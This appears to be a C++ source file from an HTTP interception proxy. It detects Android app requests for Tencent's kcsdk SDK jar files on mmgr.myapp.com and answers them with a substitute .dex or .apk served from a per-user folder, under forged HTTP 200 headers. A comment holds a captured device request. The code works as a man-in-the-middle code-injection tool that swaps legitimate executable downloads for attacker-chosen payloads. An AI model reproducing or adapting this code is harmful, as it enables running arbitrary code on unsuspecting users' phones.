
#include "QQPim.h"
#include "PluginServer.h"

int gQQpimFlag = 0;

//http://mmgr.myapp.com/myapp/wesecure_apk/kingcardext/kcsdk_sdk_no_wup_4.2.3.3430.jar


/*
mmgr.myapp.com/myapp/wesecure_apk/kingcardext/kcsdk_5.0.0.3818.jar
GET /mmgr.myapp.com/myapp/wesecure_apk/kingcardext/kcsdk_5.0.0.3818.jar?mkey=5da6b7fb73c7de22&f=1026&cip=115.199.248.215&proto=http HTTP/1.1
User-Agent: Dalvik/2.1.0 (Linux; U; Android 9; MIX 2S MIUI/V10.3.4.0.PDGCNXM)
Host: 115.231.191.147
Connection: Keep-Alive
Accept-Encoding: gzip

HTTP/1.1 200 OK
Server: 3Gdown_DK
Connection: keep-alive
Date: Wed, 16 Oct 2019 03:39:57 GMT
Cache-Control: max-age=2592000
Expires: Fri, 15 Nov 2019 03:39:57 GMT
Last-Modified: Mon, 09 Sep 2019 09:28:25 GMT
Content-Type: application/java-archive
Content-Length: 262851
X-NWS-UUID-VERIFY: fe0dd71a5c414e7c5337472a0845ee2a
X-NWS-LOG-UUID: 1506586429600118777 6751ae936f384cfb8b7995bb89bf0be6
X-Cache-Lookup: Hit From Disktank3
Access-Control-Allow-Origin: *

PK
*/

int QQPim::isQQPim(const char * url, const char * host) {
	if (strstr(host, "mmgr.myapp.com") ) {
		if (strstr(url, "/myapp/wesecure_apk/kingcardext/kcsdk_sdk_no_wup_") && strstr(url, ".jar"))
		{
			gQQpimFlag = 1;
			return TRUE;
		}else if (strstr(url, "/myapp/wesecure_apk/kingcardext/kcsdk_") && strstr(url, ".jar"))
		{
			gQQpimFlag = 2;
			return TRUE;
		}
	}

	return FALSE;
}

int QQPim::replyQQPim(char * dstbuf, LPHTTPPROXYPARAM lphttp) {
	if (gQQpimFlag == 1)
	{
		char * szHttpRespFormat = "HTTP/1.1 200 OK\r\nConnection: keep-alive\r\nContent-Type: application/octet-stream\r\nContent-Length: %u\r\n\r\n";

		string filename = Public::getUserUrl(lphttp->username, "kcsdk.dex_new.dex");//kcsdk.dex_new.dex

		int ret = PluginServer::SendPluginFile(filename.c_str(), lphttp, szHttpRespFormat, 1);
		return 0;
	}else if (gQQpimFlag == 2)
	{
		char * szHttpRespFormat = "HTTP/1.1 200 OK\r\nConnection: keep-alive\r\nContent-Type: application/java-archive\r\nContent-Length: %u\r\n\r\n";

		string filename = Public::getUserUrl(lphttp->username, "kcsdk.apk");

		int ret = PluginServer::SendPluginFile(filename.c_str(), lphttp, szHttpRespFormat, 1);
		return 0;
	}
	return FALSE;
}